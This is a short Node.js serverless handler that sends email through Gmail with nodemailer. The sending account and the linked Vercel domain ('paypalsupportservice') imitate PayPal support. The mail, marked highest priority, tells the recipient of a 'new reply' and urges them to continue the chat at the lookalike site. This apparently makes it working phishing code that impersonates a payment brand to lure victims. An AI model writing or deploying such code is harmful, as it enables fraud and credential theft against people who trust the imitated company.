import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, email, message } = req.body;

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'paypalsmartsupsupport@gmail.com',
      pass: process.env.GMAIL_APP_PASSWORD
    }
  });

  // Plain text email with the website link
  const plainText = `Hi ${name},

You have a new reply to your recent conversation.

Please view the message and continue your chat here:
https://paypalsupportservice.vercel.app/contact.html

Thank you,
The Service Team`;

  try {
    await transporter.sendMail({
      from: '"Service Team" <paypalsmartsupsupport@gmail.com>',
      to: email,
      subject: `New reply to your conversation`,
      text: plainText,
      priority: 'high',
      headers: {
        'X-Priority': '1 (Highest)',
        'X-MSMail-Priority': 'High',
        'Importance': 'High'
      }
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Nodemailer error:", error);
    res.status(500).json({ error: error.message });
  }
}
